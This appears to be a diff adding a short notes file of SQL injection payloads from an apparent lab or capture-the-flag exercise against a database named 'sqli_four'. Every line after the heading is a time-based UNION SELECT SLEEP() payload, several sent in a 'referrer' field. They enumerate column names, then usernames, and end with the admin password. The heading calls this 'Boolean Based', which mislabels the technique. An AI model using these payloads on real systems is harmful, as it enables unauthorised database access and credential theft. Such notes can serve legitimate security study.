@@ -1,0 +1,18 @@
+###Blind SQLi - Boolean Based
+
+admin123' UNION SELECT SLEEP(5),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+
+
+--------------------------------------------------
+# Metadata collection SQLi command:
+
+referrer=admin123' UNION SELECT SLEEP(0.1),2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME='username' and COLUMN_NAME !='id';
+
+
+--------------------------------------------------
+# Try enumerating the usernames for an administrator and their passwords:
+
+referrer=admin123' UNION SELECT SLEEP(0.1),2 FROM users WHERE username like "%";
+referrer=admin123' UNION SELECT SLEEP(0.3),2 FROM users WHERE username="admin" and password like "%";
+
+referrer=admin123' UNION SELECT SLEEP(0.3),2 FROM users WHERE username="admin" and password="4961";
